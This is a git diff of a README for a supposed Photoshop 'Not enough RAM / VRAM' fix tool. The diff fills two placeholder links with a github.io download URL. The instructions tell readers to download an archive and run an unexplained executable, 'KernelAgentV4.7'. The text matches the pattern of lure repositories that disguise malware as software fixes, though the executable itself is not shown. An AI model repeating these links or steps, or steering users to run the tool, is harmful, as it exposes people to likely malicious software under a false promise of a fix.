@@ -2,13 +2,15 @@
 
 This fix helps resolve the Photoshop error “Not enough RAM / VRAM” during launch or while applying effects. It adjusts Photoshop’s memory limits, clears temp data, and disables unnecessary GPU acceleration via `KernelAgentV4.7`.
 
-[![Download Memory Fix Tool](https://img.shields.io/badge/Download-Photoshop_RAM_VRAM_Fix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Memory Fix Tool](https://img.shields.io/badge/Download-Photoshop_RAM_VRAM_Fix-blueviolet)](https://photoshop-not-enough-ram-vram-fix.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://photoshop-not-enough-ram-vram-fix.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PhotoshopMemoryFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will reset memory preferences, increase available RAM allocation, and disable crash-prone GPU modes  
